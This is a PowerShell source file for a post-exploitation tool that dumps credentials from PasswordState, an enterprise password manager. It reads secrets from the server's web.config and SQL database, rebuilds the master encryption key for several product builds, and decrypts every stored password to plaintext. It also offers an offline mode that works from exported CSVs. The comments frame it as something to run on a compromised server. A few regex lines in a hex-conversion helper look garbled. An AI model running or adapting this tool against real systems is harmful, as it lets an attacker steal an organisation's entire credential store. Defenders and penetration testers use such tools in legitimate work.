function Invoke-PasswordStateDecryptor {
    <#
    .SYNOPSIS
    Connects to a PasswordState database and extracts all passwords from
    a non-FIPS installation of PasswordState. Optionally allows offline 
    decryption by giving in the secrets. For more information read the 
    accompanied blog or the source code. 

    Author: Robert Diepeveen (robert.diepeveen@northwave.nl)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION
    Invoke-PasswordStateDecryptor will connect to the database, extract all of 
    the information necessary to derive the encryption key, decrypt and return the 
    plaintext passwords for all entries in the database. 
    This script is intended to be run on a host that has all of the following:
        * SQLServer database server with PasswordState database
        * web.config from the original compromised PasswordState server
        * Moserware.SecretSplitter.dll somewhere (shipped in the repo or on the disk)
    An example of such a host is the PasswordState server itself. 

    Alternatively, if you are able to compromise the database, export all entries to CSV, the build number
    and the secret1, secret2, secret3 and secret4 values or the encryption key, you can use the script offline. The
    CSV should contain (at least) the following fields: UserName, Password, Description and Title

    .EXAMPLE
    The following command will get all entries from the database.
        Invoke-PasswordStateDecryptor -WebConfig 'C:\inetpub\PasswordState\web.config'

    Decrypts all entries without the need for a SQLServer connection, but requires knowledge of secret1 and secret3 or the encryptionkey.
        Invoke-PasswordStateDecryptor -CSVPath .\Examples\entries.csv -EncryptionKey 56a6806d61ee9eb8c4c9cb6b153f6a7a470c2966aae7a2a7d83f0acd6507bfa1
    #>
    [cmdletbinding()]
    param
    (

    [string]
    # The path to the web.config of PasswordState. Normally C:\inetpub\PasswordState\web.config .
    $WebConfig,

    [string]
    # The path to the Moserware.SecretSplitter.dll. 
    # Defaults to C:\inetpub\PasswordState\bin\Moserware.SecretSplitter.dll.
    $SecretSplitterDLL = "C:\inetpub\PasswordState\bin\Moserware.SecretSplitter.dll",

    [boolean]
    # use FIPSMode? Default is false.
    $FIPSMode = $false,

    [string]
    # The connection string to the database. Default extracts from web.config.
    $ConnectionString,

    [string]
    # The Secret1 value. Default extracts from the web.config.
    $Secret1,

    [string]
    # The Secret2 value. Default extracts from the web.config.
    $Secret2,

    [string]
    # The Secret3 value. Default extracts from the DB.
    $Secret3,

    [string]
    # The Secret4 value. Default extracts from the DB.
    $Secret4,

    [string]
    # CSV file path, allows for offline decrypting. Requires either Secret1 and Secret3 or EncryptionKey parameters
    $CSVPath,

    [string]
    # Encryption key. Default combines both secrets. The key should be hex encoded, 
    # like "56a6806d61ee9eb8c4c9cb6b153f6a7a470c2966aae7a2a7d83f0acd6507bfa1"
    $EncryptionKey,

    [int]
    # Build Number to determine which key derivation algorithm to use
    $BuildNo

    )

    begin {
        if ($PSBoundParameters.ContainsKey('WebConfig')) {
            if (-not (Test-Path -PathType Leaf -Path $WebConfig)) {
                # web.config doesn't exist
                throw "Web Config does not exist or was not given."
                exit
            }

            [xml]$configXML = Get-Content $WebConfig

            # Get connection string from web.config
            if ( -not $PSBoundParameters.ContainsKey('ConnectionString')) {
                $ConnectionString = $configXML.SelectSingleNode('/configuration/connectionStrings/add[@name="PasswordstateConnectionString"]').connectionString
                Write-Host -ForegroundColor Green "Found Connection String: $ConnectionString"
            }

            if (-not $PSBoundParameters.ContainsKey('BuildNo')) {
                $BuildNo = (Invoke-SQL -connectionString $ConnectionString -sqlCommand "SELECT BuildNo FROM SystemSettings").BuildNo
                Write-Host -ForegroundColor Green "Found BuildNo: $BuildNo"
            }

            # Get Secret1 from web.config if encryption key is not set.
            if ((-not $PSBoundParameters.ContainsKey('Secret1')) -and (-not $PSBoundParameters.ContainsKey('EncryptionKey'))) {
                $Secret1 = $configXML.SelectSingleNode('/configuration/appSettings/add[@key="Secret1"]').value
                Write-Host -ForegroundColor Green "Found Secret1: $Secret1"
                # Build 9700 and above requires Secret2
                if (($BuildNo -ge 9700) -and (-not $PSBoundParameters.ContainsKey('Secret2'))) {
                    $Secret2 = $configXML.SelectSingleNode('/configuration/appSettings/add[@key="Secret2"]').value
                    Write-Host -ForegroundColor Green "Found Secret2: $Secret2"
                }
            }

            # Get Secret3 from DB if encryption key is not set.
            if ((-not $PSBoundParameters.ContainsKey('Secret3')) -and (-not $PSBoundParameters.ContainsKey('EncryptionKey'))) {
                $secrets = Invoke-SQL -connectionString $ConnectionString -sqlCommand "SELECT secret3, secret4 FROM SystemSettings"
                $Secret3 = $secrets.secret3
                Write-Host -ForegroundColor Green "Found Secret3: $Secret3"
                # Build 9700 and above requires Secret4
                if (($BuildNo -ge 9700) -and (-not $PSBoundParameters.ContainsKey('Secret4'))) {
                    $Secret4 = $secrets.secret4
                    Write-Host -ForegroundColor Green "Found Secret4: $Secret4"
                }
            }

            # Get all entries from the database
            $entriesTable = Invoke-SQL -ConnectionString $ConnectionString -sqlCommand "SELECT Title, UserName, Description, Password FROM Passwords"
            $entries = $entriesTable.Rows
        
        } else {
            # web.config is not given

            # Build Number is required to determine key derivation algorithm
            if (-not $PSBoundParameters.ContainsKey('BuildNo')) {
                # alternative would be to default to a BuildNo like 9700
                throw "BuildNo is a required parameter in offline mode."
            }

            # we need an encryption key or secret1 and secret3 value.
            if (-not $PSBoundParameters.ContainsKey('EncryptionKey')) {
                # encryptionkey not set
                if (($BuildNo -ge 9700) -and ((-not $PSBoundParameters.ContainsKey('Secret1')) -or (-not $PSBoundParameters.ContainsKey('Secret2')) -or (-not $PSBoundParameters.ContainsKey('Secret3')) -or (-not $PSBoundParameters.ContainsKey('Secret4')))) {
                    throw "EncryptionKey or Secret1, Secret2, Secret3 and Secret4 are required parameters in offline mode for builds >= 9700."
                } elseif (-not ($PSBoundParameters.ContainsKey('Secret1')) -or (-not $PSBoundParameters.ContainsKey('Secret3'))) {
                    # secret1 or secret3 is not set
                    throw "EncryptionKey or Secret1 and Secret3 are required parameters in offline mode for builds < 9700."
                }
            }

            # Check whether CSV file exists
            if (-not (Test-Path -PathType Leaf -Path $CSVPath)) {
                throw "CSV File does not exist"
                exit
            }

            $entries = Import-CSV $CSVPath
        }

        if (-not (Test-Path -PathType Leaf $SecretSplitterDLL)) {
            throw "SecretSplitter DLL not found."
            exit
        }

        if (-not $PSBoundParameters.ContainsKey('EncryptionKey')) {
            # Load SecretSplitter (combiner) DLL.
            if (Test-Path -PathType Leaf -Path $SecretSplitterDLL) {
                Add-Type -Path $SecretSplitterDLL
            } else {
                throw "SecretSplitterDLL was not found!"
                exit
            }

            # Combine secrets and return recovered Text String
            $EncryptionKey = [Moserware.Security.Cryptography.SecretCombiner]::Combine($Secret1 + "`n" + $Secret3).RecoveredTextString
            switch ($BuildNo) {
                {$_ -lt 8903} {
                    break
                }
                {$_ -lt 9700} {
                    # For versions >= 8903 and < 9700 the key needs to be reversed
                    $EncryptionKey = $EncryptionKey[-1..-$EncryptionKey.Length ] -join ""
                    break
                }
                {$_ -ge 9700} {
                    # For versions >= 9700 the key is the HMAC of the original encryption key
                    $HMACKey = [Moserware.Security.Cryptography.SecretCombiner]::Combine($Secret2 + "`n" + $Secret4).RecoveredTextString
                    $RawHMACKey = Convert-HexStringToByteArray $HMACKey
                    # Perform HMAC-SHA256
                    $HMAC = New-Object System.Security.Cryptography.HMACSHA256
                    $HMAC.key = $RawHMACKey
                    $EncryptionKey = ($HMAC.ComputeHash((Convert-HexStringToByteArray $EncryptionKey)) | ForEach-Object ToString X2) -join ''
                    break
                }
            }
            Write-Host -ForegroundColor Green "Recovered Encryption Key: $EncryptionKey!"
        }

        $RawEncryptionKey = Convert-HexStringToByteArray $EncryptionKey

    }

    process {
        # Create a new table for output
        $outTable = New-Object system.Data.DataTable "PasswordStateDecryptor"
        
        $TitleColumn = New-Object system.Data.DataColumn Title,([string])
        $UsernameColumn = New-Object system.Data.DataColumn Username,([string])
        $DescriptionColumn = New-Object system.Data.DataColumn Description,([string])
        $PasswordColumn = New-Object system.Data.DataColumn Password,([string])

        $outTable.Columns.Add($UsernameColumn)
        $outTable.Columns.Add($PasswordColumn)
        $outTable.Columns.Add($TitleColumn)
        $outTable.Columns.Add($DescriptionColumn)

        
        foreach ($row in $entries) {
            # create a new data row
            $NewRow = $outTable.NewRow()

            if ($FIPSMode) {
                # Work in progress
                Write-Host -ForegroundColor Red "FIPS Mode is untested. May not work as expected!"
                $splitPass = Split-FIPSIVCiphertext $row.Password
                $encodedPass = Decrypt-FIPSPassword -EncryptionKey $RawEncryptionKey -CipherText $splitPass.CipherText -InitVector $splitPass.IV
                $PlainPassword = Out-Password $encodedPass
            } else {
                # decrypt normal password
                $splitPass = Split-NormalIVCiphertext $row.Password
                $encodedPass = Decrypt-NormalPassword -EncryptionKey $RawEncryptionKey -CipherText $splitPass.CipherText -InitVector $splitPass.IV
                $PlainPassword = Out-Password $encodedPass
            }

            # fill data row
            $NewRow.Password = $PlainPassword
            $NewRow.Title = $row.Title
            $NewRow.UserName = $row.UserName
            $NewRow.Description = $row.Description

            # add row to table
            $outTable.Rows.Add($NewRow)
        }
    }

    end {
        return $outTable
    }
}


function Local:Decrypt-NormalPassword {
    <#    
    .SYNOPSIS
    Decrypts a single password using the encryption key and password entry

    Author: Robert Diepeveen (robert.diepeveen@northwave.nl)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION
    Passwordstate passwords are encrypted with RijndaelManaged encryption in normal mode. 
    
    #>

    param
    (
    [parameter(Mandatory=$true)]
    [byte[]]
    # The encryptionkey byte array
    $EncryptionKey,

    [parameter(Mandatory=$true)]
    [byte[]]
    # The encrypted password as byte-array
    $CipherText,

    [parameter(Mandatory=$true)]
    [byte[]]
    # Initialization vector
    $InitVector
    )

    $RijndaelManaged = new-Object System.Security.Cryptography.RijndaelManaged
    $RijndaelManaged.KeySize = 256
    $RijndaelManaged.BlockSize = 256;

    $RijndaelManaged.Key = $EncryptionKey
    $RijndaelManaged.IV = $InitVector

    # Create Rijndael Decryptor with given parameters
    $decryptor = $RijndaelManaged.CreateDecryptor($RijndaelManaged.Key, $RijndaelManaged.IV)

    return Decrypt-CiphertextInMemory -Decryptor $decryptor -CipherText $CipherText
} 


function Local:Decrypt-FIPSPassword {
     <#    
    .SYNOPSIS
    Decrypts a single password using the encryption key and password entry

    Author: Robert Diepeveen (robert.diepeveen@northwave.nl)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION
    Passwordstate passwords are encrypted with AES256-CBC and PKCS7 padding. This function 
    decrypts a password.
    
    #>

    param
    (
    [parameter(Mandatory=$true)]
    [byte[]]
    # The encryptionkey byte array
    $EncryptionKey,

    [parameter(Mandatory=$true)]
    [byte[]]
    # The encrypted password as byte-array
    $CipherText,

    [parameter(Mandatory=$true)]
    [byte[]]
    # Initialization vector
    $InitVector
    )


    $AESCipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $AESCipher.BlockSize = 128
    $AESCipher.KeySize = 256
    $AESCipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AESCipher.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    
    $AESCipher.Key = $EncryptionKey
    $AESCipher.IV = $InitVector

    $decryptor = $AESCipher.CreateDecryptor()

    return Decrypt-CiphertextInMemory -Decryptor $decryptor -CipherText $CipherText
}


function Local:Decrypt-CiphertextInMemory {
    param(
        $Decryptor,
        $CipherText
    )
    # Create a New memory stream with the encrypted value. 
    $ms = new-Object IO.MemoryStream @(,$CipherText) 
    # Read the new memory stream and read it in the cryptology stream 
    $cs = new-Object Security.Cryptography.CryptoStream $ms,$decryptor,"Read" 
    # Read the new decrypted stream 
    $sr = new-Object IO.StreamReader $cs 
    # Return from the function the stream 
    $output = $sr.ReadToEnd() 
    # Stops the stream     
    $sr.Close() 
    # Stops the crypology stream 
    $cs.Close() 
    # Stops the memory stream 
    $ms.Close() 
    # Clears the RijndaelManaged Cryptology IV and Key 

    return $output
}

function Local:Split-IVCiphertext {
    param
    (
        [parameter(Mandatory=$true)]
        $EncryptedPassword,

        [parameter(Mandatory=$true)]
        [int]$IVSize
    )

    # Check if EncryptedPassword is string the ugly way
    if ($EncryptedPassword.GetType() -eq "".GetType()) { 
        if ($EncryptedPassword.StartsWith("0x")) {
            $EncryptedPassword = Convert-HexStringToByteArray $EncryptedPassword.Substring(2)
        } else {
            $EncryptedPassword = Convert-HexStringToByteArray $EncryptedPassword
        }
    }

    $len = $EncryptedPassword.Length

    # IV is last 32 bytes of the entry
    $IV = $EncryptedPassword[($len - $IVSize)..$len]
    
    # 0..len-33 is all chars up to the IV
    $Pass = $EncryptedPassword[0..($len-$IVSize-1)]

    return @{IV=$iv; CipherText=$Pass}
}


function Local:Split-NormalIVCiphertext {
    <#
    .SYNOPSIS
    Splits the password from the database into IV and encrypted portion. IV is always the last 32 bytes.
    #>
    param
    (
        [parameter(Mandatory=$true)]
        $EncryptedPassword
    )

    return Split-IVCiphertext -EncryptedPassword $EncryptedPassword -IVSize 32
}


function Local:Split-FIPSIVCiphertext {
    <#
    .SYNOPSIS
    Splits the password from the database into IV and encrypted portion. IV is always the last 16 bytes in FIPS mode.
    #>

    param
    (
        [parameter(Mandatory=$true)]
        $EncryptedPassword
    )
    return Split-IVCiphertext -EncryptedPassword $EncryptedPassword -IVSize 16
}


function Local:Out-Password {
    <#
    .SYNOPSIS
    Helper function to return only the password (without the counter value)

    .DESCRIPTION
    Passwordstate stores passwords with an incrementing identifier. This function strips the identifier and returns
    the plaintext password. The split is done using the '¿' character.
    #>

    param (
        [parameter(Mandatory=$true)]
        [string]
        $RawPassword
    )

    $RawPassword.Split("¿")[1]
}


# Credits to SANS
# https://www.sans.org/blog/powershell-byte-array-and-hex-functions/
function Local:Convert-HexStringToByteArray
{
    ################################################################
    #.Synopsis
    # Convert a string of hex data into a System.Byte[] array. An
    # array is always returned, even if it contains only one byte.
    #.Parameter String
    # A string containing hex data in any of a variety of formats,
    # including strings like the following, with or without extra
    # tabs, spaces, quotes or other non-hex characters:
    # 0x41,0x42,0x43,0x44
    # \x41\x42\x43\x44
    # 41-42-43-44
    # 41424344
    # The string can be piped into the function too.
    ################################################################
    [CmdletBinding()]
    Param ( [Parameter(Mandatory = $True, ValueFromPipeline = $True)] [String] $String )
    
    #Clean out whitespaces and any other non-hex crud.
    $String = $String.ToLower() -replace '[^a-f0-9\\,x\-\:]',"
    
    #Try to put into canonical colon-delimited format.
    $String = $String -replace '0x|\x|\-|,',':'
    
    #Remove beginning and ending colons, and other detritus.
    $String = $String -replace '^:+|:+$|x|\',"
    
    #Maybe there's nothing left over to convert...
    if ($String.Length -eq 0) { ,@() ; return }
    
    #Split string with or without colon delimiters.
    if ($String.Length -eq 1)
    { ,@([System.Convert]::ToByte($String,16)) }
    elseif (($String.Length % 2 -eq 0) -and ($String.IndexOf(":") -eq -1))
    { ,@($String -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}}) }
    elseif ($String.IndexOf(":") -ne -1)
    { ,@($String -split ':+' | foreach-object {[System.Convert]::ToByte($_,16)}) }
    else
    { ,@() }
    #The strange ",@(...)" syntax is needed to force the output into an
    #array even if there is only one element in the output (or none).
}


# Credits to Chris Magnuson, found on StackOverflow
# https://stackoverflow.com/questions/8423541/how-do-you-run-a-sql-server-query-from-powershell
function Local:Invoke-SQL {
    param(
        [string]$connectionString,
        [string]$sqlCommand = $(throw "Please specify a query."),
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    $connection = new-object system.data.SqlClient.SQLConnection($connectionString)
    $command = new-object system.data.sqlclient.sqlcommand($sqlCommand,$connection)
    $connection.Open()
    
    $adapter = New-Object System.Data.sqlclient.sqlDataAdapter $command
    $dataset = New-Object System.Data.DataSet
    $adapter.Fill($dataSet) | Out-Null
    
    $connection.Close()
    
    return $dataSet.Tables
}